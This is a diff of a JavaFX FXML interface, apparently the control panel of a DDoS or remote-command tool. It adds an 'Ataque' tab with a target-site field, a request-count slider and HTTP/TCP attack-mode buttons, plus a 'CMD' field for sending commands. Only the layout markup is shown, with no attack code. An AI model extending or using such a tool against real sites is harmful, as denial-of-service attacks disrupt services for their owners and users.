@@ -40,7 +40,7 @@
         <TabPane layoutY="43.0" prefHeight="239.0" prefWidth="508.0" styleClass="column-header-background"
                  tabClosingPolicy="UNAVAILABLE">
             <tabs>
-                <Tab text="DDOS">
+                <Tab text="Ataque">
                     <content>
                         <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="170.0" prefWidth="489.0">
                             <children>
@@ -48,13 +48,17 @@
                                         onAction="#handleDDOSAttack" prefHeight="51.0" prefWidth="478.0"
                                         styleClass="buttonAttack" text="Atacar"/>
                                 <Label layoutX="39.0" layoutY="29.0" text="Site"/>
-                                <TextField fx:id="TFUrl" layoutX="79.0" layoutY="22.0" prefHeight="38.0"
-                                           prefWidth="266.0"/>
+                                <TextField fx:id="TFUrl" layoutX="79.0" layoutY="22.0" onAction="#handleDDOSAttack"
+                                           prefHeight="38.0" prefWidth="266.0"/>
                                 <Button fx:id="btnAbrirUrl" layoutX="39.0" layoutY="123.0" mnemonicParsing="false"
-                                        prefHeight="34.0" prefWidth="430.0" text="Abrir"/>
+                                        onAction="#handleOpenUrl" prefHeight="34.0" prefWidth="430.0" text="Abrir"/>
                                 <Slider fx:id="sliderRequisitionQuantity" blockIncrement="1.0" layoutX="354.0"
                                         layoutY="31.0" max="10.0" min="1.0" showTickLabels="true" showTickMarks="true"
                                         value="1.0"/>
+                                <RadioButton fx:id="httpAttackRadio" layoutX="13.0" layoutY="174.0"
+                                             mnemonicParsing="false" selected="true" text="HTTP" textFill="WHITE"/>
+                                <RadioButton fx:id="tcpAttackRadio" layoutX="86.0" layoutY="174.0"
+                                             mnemonicParsing="false" text="TCP" textFill="WHITE"/>
                             </children>
                         </AnchorPane>
                     </content>
@@ -64,8 +68,8 @@
                         <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                             <children>
                                 <Label layoutX="44.0" layoutY="57.0" text="CMD"/>
-                                <TextField fx:id="TFCmd" layoutX="95.0" layoutY="49.0" prefHeight="38.0"
-                                           prefWidth="394.0"/>
+                                <TextField fx:id="TFCmd" layoutX="95.0" layoutY="49.0" onAction="#handleCMD"
+                                           prefHeight="38.0" prefWidth="394.0"/>
                                 <Button fx:id="btnEnviarCmd" layoutX="13.0" layoutY="102.0" mnemonicParsing="false"
                                         onAction="#handleCMD" prefHeight="34.0" prefWidth="482.0" text="Enviar"/>
                             </children>
